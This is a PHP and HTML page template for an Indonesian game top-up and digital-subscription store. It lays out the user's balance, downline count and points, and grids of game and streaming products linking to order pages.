<?php 
require '../connect.php';
require _DIR_('library/session/user');

function gameMenu($x) {
    $out = '';
    for($i = 0; $i <= count($x)-1; $i++) {
        $cat = $x[$i];
$img = 'https://i.pinimg.com/originals/5e/22/86/5e2286e02a8d3a65558ad3adf7534670.jpg';
        if($cat == 'Arena of Valor') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/aov_tile.jpg';
        if($cat == 'Be The King') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/betheking_tile.png';
        if($cat == 'Voucher PB Zepetto') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/PointBlank_ID_tile.jpg';
        if($cat == 'Garena Shell Murah') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/garena_shells_tile.jpg';
        if($cat == 'Call of Duty Mobile') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/codmobile_tile.jpg';
        if($cat == 'Dragon Raja') $img = '../new-icon/dragon.jpg';
        if($cat == 'Chess Rush') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/chessrush_tile.jpg';
        if($cat == 'Free Fire') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/freefire_tile.jpg';
        if($cat == 'Free Fire Promo') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/freefire_tile.jpg';
        if($cat == 'Free Fire Vilog') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/freefire_tile.jpg';
        if($cat == 'HAGO') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/hago_tile.jpg';
        if($cat == 'Legends of Runeterra') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/lor_tile.jpg';
        if($cat == 'League of Legends Wild Rift') $img = '../new-icon/wildrift.jpg';
        if($cat == 'LifeAfter') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/lifeafter_tile.jpeg';
        if($cat == 'Mobile Legends Slow') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/mlbb_tile.jpg';
        if(substr($cat,0,5) == 'PUBGM') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/pubgm_rps_tile.jpg';
        if($cat == 'UC PUBGM') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/pubgm_rps_tile.jpg';
        if($cat == 'PB Zepetto') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/PointBlank_ID_tile.jpg';
        if($cat == 'Ragnarok M Eternal Love') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/ragnarok_tile.jpg';
        if($cat == 'Speed Drifters') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/speed_drifter_tile.jpg';
        if($cat == 'Valorant') $img = '../new-icon/valorant.jpg';
        if($cat == 'Voucher Valorant') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/valorant_tile.jpg';
        if($cat == 'World of Dragon Nest') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/The_World_Of_Dragon_Nest.jpg';
        if($cat == 'Light of Thel') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/LightofThel_tile.png';
        if($cat == 'Lords Mobile') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/lords_mobile_tile.png';
        if($cat == 'Higgs Domino') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/higgs_domino_tile.jpg';
        if($cat == 'League of Legends') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/lolwildrift_tile.png';
        if($cat == 'League of Legends Wild Rift') $img = '../new-icon/wildrift.jpg';
        if($cat == 'Omega Legends') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/omegalegends_tile.png';
        if($cat == 'One Punch Man') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/onepunchman_tile.png';
        if($cat == 'RagnaroK X Next Generation') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/ragnarok_x_tile.jpg';
        if($cat == 'Ragnarok X Razer Link') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/ragnarok_x_tile.jpg';
        if($cat == 'PO Garena Shell') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/garena_shells_tile.jpg';
        if($cat == 'Garena Shell Promo') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/garena_shells_tile.jpg';
        if($cat == 'Voucher PointBlank') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/PointBlank_ID_tile.jpg';
        if($cat == 'Genshin Impact') $img = 'https://cdn1.codashop.com/S/content/mobile/images/product-tiles/genshin_tile.png';
        if($cat == 'Mobile Legends Gift') $img = '../new-icon/mlbb-new.png';
        if($cat == 'Mobile Legends Promo') $img = '../new-icon/ml-promo-icon.jpg';
        if($cat == 'Apex Legends Mobile') $img = '../new-icon/icon/icon-apex-legends.jpg';
        if($cat == 'Canva Pro') $img = 'https://th-live-05.slatic.net/p/eb6e9b42a3ee41f31451c7bc6d29e86e.jpg_720x720q80.jpg_.webp';
        if($cat == 'Disney Hotstar') $img = '../new-icon/icon/disney-hotstar-icon.jpg';
        if($cat == 'Free Fire Max') $img = '../new-icon/icon/free-fire-new.jpg';
        if($cat == 'iQIYI Premium') $img = 'https://static-s.aa-cdn.net/img/gp/20600011895764/qcnLIY2j3sD631py3vbhbe4KAoUfoNGIiag52awMmiBB1qpJtqCxOIcYPgARW_bfQ58=s300?v=1';
        if($cat == 'Marvel Super War') $img = '../new-icon/icon/marvel-super-war-icon.png';
        if($cat == 'Mobile Legends') $img = '../new-icon/icon/mlbb.jpg';
        if($cat == 'Mobile Legends A') $img = '../new-icon/icon/Menu_MLBB_A.jpg';
        if($cat == 'Mobile Legends B') $img = '../new-icon/icon/Menu_MLBB_B.jpg';
        if($cat == 'Mobile Legends Global') $img = '../new-icon/ml.jpg';
        if($cat == 'Mobile Legends Vilog') $img = '../new-icon/icon/ml-vilog-iconn.jpg';
        if($cat == 'Youtube Premium') $img = '../new-icon/icon/youtube-new.jpg';
        if($cat == 'WeTV Premium') $img = 'https://cf.shopee.co.id/file/bcc57869475b868a686844e4fb82e4ee';
        if($cat == 'Vidio Premier') $img = '../new-icon/icon/vidio-premier.jpg';
        if($cat == 'Super Sus') $img = '../new-icon/icon/super-sus-icon.png';
        if($cat == 'Tom and Jerry Chase') $img = '../new-icon/icon/tom-and-jerry-chase.jpg';
        if($cat == 'Steam Wallet Code') $img = '../new-icon/1642190011_tile.jpg';
        if($cat == 'Spotify Premium') $img = '../new-icon/icon/spotify.jpg';
        if($cat == 'Sausage Man') $img = '../new-icon/icon/sausage-man-new.jpg';
        if($cat == 'PUBG GLOBAL') $img = '../new-icon/icon/pubgm-g-icon.jpg';
        if($cat == 'PUBGM MOBILE') $img = '../new-icon/pubgm.jpg';
        if($cat == 'PUBGM INDO A') $img = '../new-icon/icon/pubgm-a-icon.jpg';
        if($cat == 'PUBGM INDO B') $img = '../new-icon/icon/pubgm-b-icon.jpg';
        if($cat == 'PUBGM New State') $img = '../new-icon/icon/pubgm-new-state.jpg';
        if($cat == 'Mobile Legends Membership') $img = '../new-icon/icon/starlight-new.jpg';
        if($cat == 'Netflix Premium') $img = '../new-icon/icon/netflix.jpg';
        if($cat == 'Voucher Megaxus') $img = '../new-icon/1642189426.png';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        if($cat == '') $img = '';
        
        
        
        if($cat == 'EARTOK') $img = 'https://lh3.googleusercontent.com/g50sgx6vAuiBFhl7ybyO_N8RVkwV8R-nbnKxEcyTHtJvpphpohdJRGC4c2fjvX-bdA0';
    

        $out .= '<a href="javascript:;" onclick="javascript:location.href=\''.base_url('order/game/'.str_replace(' ','-',strtolower($cat))).'\'" class="category__product-container js-link-click"><img data-src="'.$img.'" alt="" class="category__product-image lozad" src="'.$img.'" data-loaded="true"><div class="category__product-title">'.$cat.'</div></a>';
    }
    return $out;
}

if(conf('xtra-fitur',2) <> 'true') exit(redirect(0,base_url()));
require _DIR_('library/layout/header.user');
?>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.2/font/bootstrap-icons.css">
<style type="text/css">
.category-container{max-width:760px;margin:2px auto 0}.category__product-row{display:block;max-width:100%;padding:0 5px 15px}.category__title{font-size:20px;font-family:Lato-Bold,sans-serif;padding-left:10px;padding-bottom:10px;text-transform:uppercase;color:#636363}*{box-sizing:border-box}@media only screen and (min-width:768px){.category__product-container{width:20%;padding:12px}}@media only screen and (max-width:768px){.category__product-container{width:25%;padding:12px;width:33.333333%}}.category__product-container{display:inline-block;text-align:center;text-decoration:none;cursor:pointer;padding:5px;vertical-align:top}.category__product-image{display:block;border-radius:15px;margin:auto;max-width:100%}.category__product-title{color:#000;padding-top:7px;max-width:128px;margin:auto}
.images .category__product-container img{
    transition: transform 0.2s linear;
}
.category__product-container:hover img{
    transform: scale(1.05);
}
</style>
<!--=========================================================-->  
<!--batas untuk di edit by babybot/nurhadi-->  
<!--=========================================================-->  
<div id="carouselExampleCaptions" class="carousel slide mb-0" data-ride="carousel">
<ol class="carousel-indicators">
<li data-target="#carouselExampleCaptions" data-slide-to="0" class="active"></li><li data-target="#carouselExampleCaptions" data-slide-to="1" class=""></li> </ol>
<div class="carousel-inner" style="border-radius: 50px;" role="listbox">
<div class="carousel-item carousel-item-next carousel-item-left"><a href="/bannerhadi/had2.png" class="image-popup"><img class="d-block img-fluid" src="/bannerhadi/had1.png"></a></div><div class="carousel-item active carousel-item-left"><a href="/bannerhadi/had1.png" class="image-popup"><img class="d-block img-fluid" src="/bannerhadi/had2.png"></a></div> </div>
</div>
          </div>
            </div>
<!--=========================================================-->  
<!--batas untuk di edit by babybot/nurhadi-->  
<!--=========================================================-->  
            <div class="container" style="margin-top:-3px;">
                <div class="kotak mb-4 shadow">
                    <div class="kotak-body">
                        <div class="row justify-content-around align-items-center">
                            <div class="col text-center">
                                <p><b><span class="badge badge-glow badge-pill badge-primary">Rp <?= currency($data_user['balance']) ?></span></b></b><br><small class="text-mute"><i class="fas fa-wallet"></i> Saldo</small></p>
                            </div>
                            <div class="col text-center border-left-dotted-blue">
                                <p><b><span class="badge badge-glow badge-pill badge-info"><?= currency($call->query("SELECT id FROM users WHERE uplink = '" . $data_user['referral'] . "'")->num_rows) . ' User' ?></span></b><br><small class="text-mute"><i class="fa fa-users"></i> Downline</small></p>
                            </div>
                            <div class="col text-center border-left-dotted-blue">
                                <p><b><span class="badge badge-glow badge-pill badge-warning">Rp <?= currency($data_user['point']) ?></span></b><br><small class="text-mute"><i class="fas fa-trophy"></i> Poin</small></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="_1ekcz mt-1" style="width: 100%;">
<!--=========================================================-->  
<!--batas untuk di edit by babybot/nurhadi-->  
<!--=========================================================-->              
<div class="row">
    <div class="category-container">
  <ul class="nav nav-tabs nav-fill" id="myTab" role="tablist">
    <li class="nav-item">
      <a class="nav-link active" data-toggle="pill" href="#menu1">Games</a>
    </li>
    
    
    <li class="nav-item">
      <a class="nav-link" data-toggle="pill" href="#menu2">Produk Lainnya</a>
    </li>
    
  </ul>
  
 <div class="tab-content">
    <div id="menu1" class="container tab-pane active"><br>
    <h4><b class="badge badge-light-info">New - Release</b></h4>
<div class="category-container">
    <div class="category__product-row">
        <div class="category__title"></div>
        <a href="javascript:;" onclick="javascript:location.href='../order/game/hyper-front'" class="category__product-container js-link-click">
            <img data-src="../new-icon/icon/hyper-front.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/hyper-front.webp" data-loaded="true">
            <div class="category__product-title">Hyper Front</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/mobile-legends-joki-rank'" class="category__product-container js-link-click">
            <img data-src="../new-icon/icon/mlbb-joki-rank.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/mlbb-joki-rank.webp" data-loaded="true">
            <div class="category__product-title">Mobile Legends Joki Rank</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/tower-of-fantasy'" class="category__product-container js-link-click">
            <img data-src="../new-icon/icon/tower-of-fantasy-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/tower-of-fantasy-icon.webp" data-loaded="true">
            <div class="category__product-title">Tower of Fantasy</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/lita'" class="category__product-container js-link-click">
            <img data-src="../new-icon/icon/game/lita-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/lita-icon.webp" data-loaded="true">
            <div class="category__product-title">LITA</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/apex-legends-mobile'" class="category__product-container js-link-click">
            <img data-src="../new-icon/icon/icon-apex-legends.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/icon-apex-legends.webp" data-loaded="true">
            <div class="category__product-title">Apex Legends Mobile</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/honkai-impact-3'" class="category__product-container js-link-click">
                <img data-src="../new-icon/icon/honkai-impact-3.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/honkai-impact-3.webp" data-loaded="true"><div class="category__product-title">Honkai Impact 3</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/marvel-super-war'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/marvel-super-war-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/marvel-super-war-icon.webp" data-loaded="true"><div class="category__product-title">Marvel Super War</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/steam-wallet-code'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/1642190011_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/1642190011_tile.webp" data-loaded="true"><div class="category__product-title">Steam Wallet Code</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/super-sus'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/super-sus-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/super-sus-icon.webp" data-loaded="true"><div class="category__product-title">Super Sus</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/valorant'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/valorant-new.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/valorant-new.webp" data-loaded="true"><div class="category__product-title">Valorant</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/arena-of-valor'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/aov_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/aov_tile.webp" data-loaded="true"><div class="category__product-title">Arena Of Valor</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/efootball-2023-vilog'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/9undLj4YJQinRpd1u50Dv33H.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/9undLj4YJQinRpd1u50Dv33H.webp" data-loaded="true"><div class="category__product-title">eFootball 2023 Vilog</div></a>
                
                
                </div>

</div>
 <hr />
 <br />
     <h4><b class="badge badge-light-info">Game - Populer</b></h4>
    </center>
    <div class="category-container">
    <div class="category__product-row">
        <div class="category__title"></div>
        <a href="javascript:;" onclick="javascript:location.href='../order/game/dragon-raja'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/dragon-raja.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/dragon-raja.webp" data-loaded="true"><div class="category__product-title">Dragon Raja</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/free-fire'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/free-fire.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/free-fire.webp" data-loaded="true"><div class="category__product-title">Free Fire</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/free-fire-max'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/ff.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/ff.webp" data-loaded="true"><div class="category__product-title">Free Fire Max</div></a><!--<a href="javascript:;" onclick="javascript:location.href='../order/game/free-fire-promo'" class="category__product-container js-link-click"><img data-src="../new-icon/free-firee-promo.webp" alt="" class="category__product-image lozad" src="../new-icon/free-firee-promo.webp" data-loaded="true"><div class="category__product-title">Free Fire Promo</div></a>--><a href="javascript:;" onclick="javascript:location.href='../order/game/genshin-impact'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/genshin_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/genshin_tile.webp" data-loaded="true"><div class="category__product-title">Genshin Impact</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/league-of-legends'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/lolwildrift_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/lolwildrift_tile.webp" data-loaded="true"><div class="category__product-title">League of Legends</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/lifeafter'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/lifeafter_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/lifeafter_tile.webp" data-loaded="true"><div class="category__product-title">LifeAfter</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/light-of-thel'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/LightofThel_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/LightofThel_tile.webp" data-loaded="true"><div class="category__product-title">Light of Thel</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/lords-mobile'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/lords_mobile_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/lords_mobile_tile.webp" data-loaded="true"><div class="category__product-title">Lords Mobile</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/omega-legends'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/omegalegends_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/omegalegends_tile.webp" data-loaded="true"><div class="category__product-title">Omega Legends</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/one-punch-man'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/one-punch-man.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/one-punch-man.webp" data-loaded="true"><div class="category__product-title">One Punch Man</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/pubgm-global'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/pubgm-g-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/pubgm-g-icon.webp" data-loaded="true"><div class="category__product-title">PUBGM GLOBAL</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/pubgm-indo-a'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/pubgm-a-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/pubgm-a-icon.webp" data-loaded="true"><div class="category__product-title">PUBGM INDO A</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/pubgm-indo-b'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/pubgm-b-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/pubgm-b-icon.webp" data-loaded="true"><div class="category__product-title">PUBGM INDO B</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/ragnarok-m-eternal-love'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/ragnarok_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/ragnarok_tile.webp" data-loaded="true"><div class="category__product-title">Ragnarok M Eternal Love</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/ragnarok-x-next-generation'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/ragnarox-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/ragnarox-icon.webp" data-loaded="true"><div class="category__product-title">RagnaroK X Next Generation</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/sausage-man'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/sausage-man-new.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/sausage-man-new.webp" data-loaded="true"><div class="category__product-title">Sausage Man</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/tom-and-jerry-chase'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/tom-and-jerry-chase.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/tom-and-jerry-chase.webp" data-loaded="true"><div class="category__product-title">Tom and Jerry Chase</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/zepetto'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/zepeto_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/zepeto_tile.webp" data-loaded="true"><div class="category__product-title">Zepeto</div></a>    </div>
</div>
<hr />
<br />
 <h4><b class="badge badge-light-info">Mobile Legends</b></h4>
<div class="category-container">
    <div class="category__product-row">
        <div class="category__title"></div>
        <a href="javascript:;" onclick="javascript:location.href='../order/game/mobile-legends-vilog'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/ml-vilog-iconn.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/ml-vilog-iconn.webp" data-loaded="true"><div class="category__product-title">Mobile Legends Vilog</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/mobile-legends-gift'" class="category__product-container js-link-click"><img data-src="../new-icon/mlbb-new.webp" alt="" class="category__product-image lozad" src="../new-icon/mlbb-new.png" data-loaded="true"><div class="category__product-title">Mobile Legends Gift</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/mobile-legends-a'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/mobile-legends-a.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/mobile-legends-a.webp" data-loaded="true"><div class="category__product-title">Mobile Legends A</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/mobile-legends-b'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/mobile-legends-b.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/mobile-legends-b.webp" data-loaded="true"><div class="category__product-title">Mobile Legends B</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/mobile-legends-membership'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/starlight-new.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/starlight-new.webp" data-loaded="true"><div class="category__product-title">Mobile Legends Membership</div></a>    </div>
  </div>

<br />

 <h4><b class="badge badge-light-info">Call of Duty Mobile</b></h4>
<div class="category-container">
    <div class="category__product-row">
        <div class="category__title"></div>
        <a href="javascript:;" onclick="javascript:location.href='../order/game/call-of-duty-mobile'" class="category__product-container js-link-click"><img data-src="https://play-lh.googleusercontent.com/LOFXokvI6UpqfRGcTt_aIckyr3R8V8T8S-vsejruTTt930tAOn-a5f7qeDSI3YYXzCw" alt="" class="category__product-image lozad" src="https://play-lh.googleusercontent.com/LOFXokvI6UpqfRGcTt_aIckyr3R8V8T8S-vsejruTTt930tAOn-a5f7qeDSI3YYXzCw" data-loaded="true"><div class="category__product-title">Call of Duty Mobile</div></a></div>
  </div>

<br />
    <!--<h4><b class="badge badge-light-primary">Games Vilog</b></h4>
<div class="category-container">
    <div class="category__product-row">
        <div class="category__title"></div>
        <a href="javascript:;" onclick="javascript:location.href='../order/game/mobile-legends-vilog'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/ml-vilog-iconn.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/ml-vilog-iconn.webp" data-loaded="true"><div class="category__product-title">Mobile Legends Vilog</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/genshin-impact-vilog'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/genshin_tile.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/genshin_tile.webp" data-loaded="true"><div class="category__product-title">Genshin Impact Vilog</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/efootball-2023-vilog'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/9undLj4YJQinRpd1u50Dv33H.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/9undLj4YJQinRpd1u50Dv33H.webp" data-loaded="true"><div class="category__product-title">eFootball 2023 Vilog</div></a>    </div>
  </div> -->
</div>
    <!-- Tab panes -->
    <div id="menu2" class="container tab-pane fade"><br>
    <h4><b class="badge badge-light-info">Produk - Lainnya</b></h4>
<div class="category-container">
    <div class="category__product-row">
        <div class="category__title"></div>
        <a href="javascript:;" onclick="javascript:location.href='../order/game/telegram-premium'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/icon-telegram-prem.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/icon-telegram-prem.webp" data-loaded="true"><div class="category__product-title">Telegram Premium</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/apple-gift-card'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/apple-gift-card.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/apple-gift-card.webp" data-loaded="true"><div class="category__product-title">Apple Gift Card</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/canva-pro'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/eb6e9b42a3ee41f31451c7bc6d29e86e.jpg_720x720q80.jpg_.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/eb6e9b42a3ee41f31451c7bc6d29e86e.jpg_720x720q80.jpg_.webp" data-loaded="true"><div class="category__product-title">Canva Pro</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/disney-hotstar'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/disney-hotstar-icon.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/disney-hotstar-icon.webp" data-loaded="true"><div class="category__product-title">Disney Hotstar</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/iqiyi-premium'" class="category__product-container js-link-click"><img data-src="https://static-s.aa-cdn.net/img/gp/20600011895764/qcnLIY2j3sD631py3vbhbe4KAoUfoNGIiag52awMmiBB1qpJtqCxOIcYPgARW_bfQ58=s300?v=1" alt="" class="category__product-image lozad" src="https://static-s.aa-cdn.net/img/gp/20600011895764/qcnLIY2j3sD631py3vbhbe4KAoUfoNGIiag52awMmiBB1qpJtqCxOIcYPgARW_bfQ58=s300?v=1" data-loaded="true"><div class="category__product-title">iQIYI Premium</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/netflix-premium'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/netflix.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/netflix.webp" data-loaded="true"><div class="category__product-title">Netflix Premium</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/spotify-premium'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/spotify.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/spotify.webp" data-loaded="true"><div class="category__product-title">Spotify Premium</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/vidio-premier'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/vidio-premier.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/vidio-premier.webp" data-loaded="true"><div class="category__product-title">Vidio Premier</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/wetv-premium'" class="category__product-container js-link-click"><img data-src="https://cf.shopee.co.id/file/bcc57869475b868a686844e4fb82e4ee" alt="" class="category__product-image lozad" src="https://cf.shopee.co.id/file/bcc57869475b868a686844e4fb82e4ee" data-loaded="true"><div class="category__product-title">WeTV Premium</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/youtube-premium'" class="category__product-container js-link-click"><img data-src="../new-icon/icon/youtube-new.webp" alt="" class="category__product-image lozad" src="../new-icon/icon/youtube-new.webp" data-loaded="true"><div class="category__product-title">Youtube Premium</div></a>    </div>
  </div>
  
  <hr />
  <br />

<!--<h4><b class="badge badge-light-info">Produk - PPOB</b></h4>-->
<!--<div class="category-container">-->
<!--    <div class="category__product-row">-->
<!--        <div class="category__title"></div>-->
<!--        <a href="javascript:;" onclick="javascript:location.href='../order/game/dana'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/dana.png" alt="" class="category__product-image lozad" src="../new-icon/lainnya/dana.png" data-loaded="true"><div class="category__product-title">Dana</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/ovo'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/ovo.png" alt="" class="category__product-image lozad" src="../new-icon/lainnya/ovo.png" data-loaded="true"><div class="category__product-title">Ovo</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/shopeepay'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/spay.png" alt="" class="category__product-image lozad" src="../new-icon/lainnya/spay.png" data-loaded="true"><div class="category__product-title">ShopeePay</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/grab'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/grab.png" alt="" class="category__product-image lozad" src="../new-icon/lainnya/grab.png" data-loaded="true"><div class="category__product-title">GRAB</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/linkaja'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/link-aja.png" alt="" class="category__product-image lozad" src="../new-icon/lainnya/link-aja.png" data-loaded="true"><div class="category__product-title">Link-Aja</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/maxin'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/maxim.png" alt="" class="category__product-image lozad" src="../new-icon/lainnya/maxim.png" data-loaded="true"><div class="category__product-title">Maxim</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/tix-id'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/tixid.png" alt="" class="category__product-image lozad" src="../new-icon/lainnya/tixid.png" data-loaded="true"><div class="category__product-title">Tix ID</div></a> </div>-->
<!--  </div>-->

<!--</div> -->
<!--    <div id="voc" class="container tab-pane fade"><br>-->
<!--    <h4><b class="badge badge-light-info">Voucher - Game</b></h4>-->
